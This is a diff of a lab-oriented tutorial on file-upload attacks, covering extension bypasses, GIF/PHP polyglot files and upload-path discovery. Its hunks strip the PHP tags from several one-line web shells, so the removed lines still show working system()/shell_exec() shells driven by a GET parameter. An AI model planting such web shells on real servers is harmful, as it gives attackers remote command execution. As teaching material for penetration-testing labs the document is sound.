@@ -30,7 +30,7 @@ Example:
 The server checks the extension but not the file content.  
 Example:  
     GIF89a  
-    <?php system($_GET['cmd']); ?>  
+    php system($_GET['cmd']);   
 A “polyglot” file that is both an image and PHP.
 4. Path Traversal in Uploads  
 The attacker controls the upload path.  
@@ -50,7 +50,7 @@ Example:
 Here’s a practical checklist you can use in every lab.
 1. Try uploading a simple PHP web shell  
 Example:  
-    <?php echo shell_exec($_GET['cmd']); ?>  
+    php echo shell_exec($_GET['cmd']);   
 If it uploads, test if it executes.
 2. Try extension bypasses  
 Upload files named:
@@ -67,7 +67,7 @@ Even if the file is PHP.
 4. Try polyglot payloads  
 Start the file with a valid image header:  
     GIF89a;  
-    <?php system($_GET['cmd']); ?>
+    php system($_GET['cmd']); 
 5. Check where the file is stored  
 Sometimes the app tells you:  
     File uploaded to /uploads/2024/01/  
